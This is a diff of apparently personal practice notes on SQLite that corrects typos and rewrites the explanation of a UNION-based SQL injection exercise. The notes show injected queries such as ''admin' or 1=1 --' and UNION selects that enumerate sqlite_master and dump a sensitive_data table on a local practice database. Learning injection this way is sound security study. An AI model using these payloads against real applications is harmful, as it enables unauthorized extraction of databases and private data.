@@ -188,7 +188,7 @@ Create a schema with 2 tables
 CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
-   passowrd TEXT,
+   password TEXT,
    role TEXT,
    email TEXT
 );
@@ -255,7 +255,7 @@ delete from raspbian where banner not like '%Raspbian%';
 
 drop a table
 ```sql
-DROP TABLE table_name 
+DROP TABLE table_name;
 ```
 
 SQLi union practice
@@ -264,7 +264,7 @@ assuming we have injection here in the value of the username column of the users
 ```sql
 select username,role,email from users where username == '';
 select username,role,email from users where username == 'admin';
-select Username,role,email from users where username == 'admin' or 1=1 --';
+select username,role,email from users where username == 'admin' or 1=1 --';
 ```
 
 We want to use union to join some of the `sqlite_master` data with the
@@ -302,8 +302,9 @@ select type,name,sql from sqlite_master;
 +-------+----------------+-------------------------------+
 ```
 
-Confirm we have 3 columns with NULL, NULL, NULL, but we know we do.
-Then try to do a UNION of type,name,sql from `sqlite_master` into users
+Confirm we have 3 columns with NULL,NULL,NULL, but we know we do.
+We now need to do an UNION of `sqlite_master` into users,
+but we only have 3 columns so we can choose just what matters, e.g: type,name,sql.
 ```sql
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL,NULL,NULL --';
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT type,name,sql FROM sqlite_master --';
@@ -336,10 +337,12 @@ select username,role,email from users where username == 'admin' or 1=1 UNION SEL
 
 Great at this point we know a lot, we know exactly what the tables are,
 but also their schemas, which means we know the name of each of their respective columns.
-So we can use UNION again to get everything from the sensitive data table.
+So we can use UNION again to get the 3 specific columns we want from the sensitive data table.
+But also, it turns out there's just 3 colums in `sensitive_data` just like our users statement
+so we can just `SELECT *`.
 ```sql
-select username,role,email from users where username == 'admin' or 1=1 UNION SELECT * FROM sensitive_data --';
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT id,data_type,content FROM sensitive_data --';
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT * FROM sensitive_data --';
 ```
 ```
 +----------+---------------+--------------------------------------------+
